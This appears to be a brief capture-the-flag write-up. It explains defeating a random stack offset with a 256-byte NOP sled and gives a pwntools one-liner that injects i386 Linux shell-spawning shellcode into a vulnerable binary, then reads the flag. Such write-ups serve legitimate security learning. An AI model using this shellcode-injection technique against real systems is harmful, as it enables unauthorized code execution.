From the source code we learned that the random generated offset is no more than 256, we can add some padding to skip the range make sure our shellcode can be loaded completely.
```
$ (python -c "import pwn;print('\x90'*256+pwn.asm(pwn.shellcraft.i386.linux.sh()))"; cat)|./vuln 
```


By executing the code we have access the shell. ``cat`` to get the flag.
```
 cat flag.txt 
```
